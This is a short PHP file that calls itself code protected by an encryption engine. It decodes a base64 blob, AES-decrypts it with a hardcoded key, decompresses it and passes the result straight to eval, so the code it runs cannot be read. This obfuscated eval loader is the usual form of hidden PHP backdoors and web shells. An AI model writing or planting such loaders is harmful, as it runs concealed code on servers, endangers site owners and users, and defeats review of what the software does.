<?php
/* PROTECTED BY TALISMAN ENCRYPTION ENGINE v2.0 */
$keaaf3 = 'Talisman_Ultimate_WebSuite_2026_SecureKey!';
$pb859f = base64_decode('rbnbQkRBvnMW6+k5hazq921kM05wRlRWeXdTWjM1MHdFdVhEbThtdWxZQ1ppZlBtbHAyNW5DM1dsaGtDNnFwaU94YUlGVEFzNjVjTm01RENkdy9xTFZzYjM4Uk9CTkNrRzdJeHRjMy9iNld5ZVBMUG9wVnFJdnhrVDVKd1c1TXhoMzFaNXBMb2tlV2hqMG8rUDcvNGlkT2w3NHBsSVM2NlZnSE1MMzFoT21qK0pPbks4aDU4REFydlE2L0RmM0JhZTR0ckZjWjQremZRbUpGU2pQZjZSWUJHbmp4ZWpCUVFwdysyQ1dWaVBzeWd2cFduTHhIT2lZUDNZVUY0dFE1Y0pudGNUN2NTZjNoSlgwV2k=');
$i253ae = openssl_cipher_iv_length('aes-256-cbc');
$vf63d6 = substr($pb859f, 0, $i253ae);
$c4a624 = substr($pb859f, $i253ae);
eval('?>'.gzinflate(openssl_decrypt($c4a624, 'aes-256-cbc', $keaaf3, 0, $vf63d6)));